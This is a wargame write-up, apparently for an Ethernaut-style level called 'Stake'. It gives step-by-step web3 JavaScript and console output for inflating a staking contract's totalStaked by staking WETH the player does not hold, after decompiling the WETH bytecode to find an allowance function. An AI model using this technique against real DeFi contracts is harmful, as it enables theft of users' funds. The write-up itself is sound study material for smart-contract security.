# Level 31: Stake

## Wargame
To complete this level, the contract state must meet the following conditions:
- The Stake contract's ETH balance has to be greater than 0.
- totalStaked must be greater than the Stake contract's ETH balance.
- You must be a staker.
- Your staked balance must be 0.

## Key Insights
- Bytecode Decompile

## Attack Steps

### 1. Target Contract Address

```
0x94711D23c71b52BcB321e4ADe2655D90f34c36A5
````

### 2. Inspect WETH Contract

- Retrieve the WETH contract address and bytecode:
    ```javascript
    weth = await contract.WETH()
    await web3.eth.getCode(weth)
    // '0x608060405234801561000f575f80fd5b50600436106100c4575f3560e01c806 ...'
    ````

- Using [Dedaub Bytecode Decompiler](https://app.dedaub.com/decompile?network=ethereum), analyze the bytecode and identify that function selector `0x39509351` corresponds to:
    ```
    increaseAllowance(address,uint256)
    ```

### 3. Exploit Steps

- Increase Allowance for Stake Contract:
    ```javascript
    const functionSelector = '0x39509351';
    const oneEtherInWei = web3.utils.toWei('1', 'ether');
    const encodedSender = web3.eth.abi.encodeParameter('address', instance).slice(2);
    const encodedAmount = web3.eth.abi.encodeParameter('uint256', oneEtherInWei).slice(2);
    const wethData = functionSelector + encodedSender + encodedAmount;
    const weth = await contract.WETH();

    await web3.eth.sendTransaction({
        from: player,
        to: weth,
        data: wethData
    });
    ```

- Call `StakeETH` with 0.002 ether:
    ```javascript
    valueInWei = web3.utils.toWei('0.002', 'ether');
    const StakeETHData = web3.eth.abi.encodeFunctionCall({
        name: 'StakeETH',
        type: 'function',
        inputs: []
    }, []);

    await web3.eth.sendTransaction({
        from: player,
        to: instance,
        value: valueInWei,
        data: StakeETHData
    });

    balance = await contract.UserStake(player)
    fromWei(balance)
    // '0.002'
    ```

- Stake more using WETH:
    ```javascript
    valueInWei = web3.utils.toWei('0.003', 'ether');
    await contract.StakeWETH(valueInWei)

    await getBalance(instance)
    // '0.002'

    total = await contract.totalStaked()
    fromWei(total)
    // '0.005'

    balance = await contract.UserStake(player)
    fromWei(balance)
    // '0.005'
```

- Call `attack()` in the `StakeAttack` contract, transferring 0.004 ether:
    ```javascript
    await getBalance(instance)
    // '0.006'

    total = await contract.totalStaked()
    fromWei(total)
    // '0.009'

    balance = await contract.UserStake(player)
    fromWei(balance)
    // '0.005'
    ```

- Unstake Player's Balance:
    ```javascript
    valueInWei = web3.utils.toWei('0.005', 'ether');
    await contract.Unstake(valueInWei)
    ```

- Verify Challenge Completion
    ```javascript
    await getBalance(instance)
    // '0.001'

    total = await contract.totalStaked()
    fromWei(total)
    // '0.004'

    await contract.Stakers(player)
    // 'true'

    balance = await contract.UserStake(player)
    fromWei(balance)
    // '0'
    ```